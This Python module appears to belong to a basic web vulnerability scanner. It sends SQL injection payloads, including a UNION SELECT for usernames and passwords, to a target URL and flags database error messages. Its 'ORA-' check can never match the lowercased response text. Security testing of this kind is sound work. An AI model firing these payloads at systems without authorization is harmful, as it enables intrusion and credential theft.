# modules/sql_injection.py

import requests
from colorama import Fore

payloads = [
    "'", 
    "' OR '1'='1", 
    "' UNION SELECT NULL, username, password FROM users --",
    '" OR "1"="1" --',
    "1' OR 1=1 --"
]

def scan(url):
    results = [f"[SQL Injection Test] Target: {url}"]
    vulnerable = False

    for payload in payloads:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            errors = ["mysql", "syntax error", "warning", "ORA-"]
            if any(error in response.text.lower() for error in errors):
                message = f"[!] Possible SQL Injection at: {test_url}"
                print(Fore.RED + message + Fore.RESET)
                results.append(message)
                vulnerable = True
        except requests.exceptions.RequestException:
            continue

    if not vulnerable:
        message = "[+] No SQL Injection vulnerabilities found."
        print(Fore.GREEN + message + Fore.RESET)
        results.append(message)

    return results
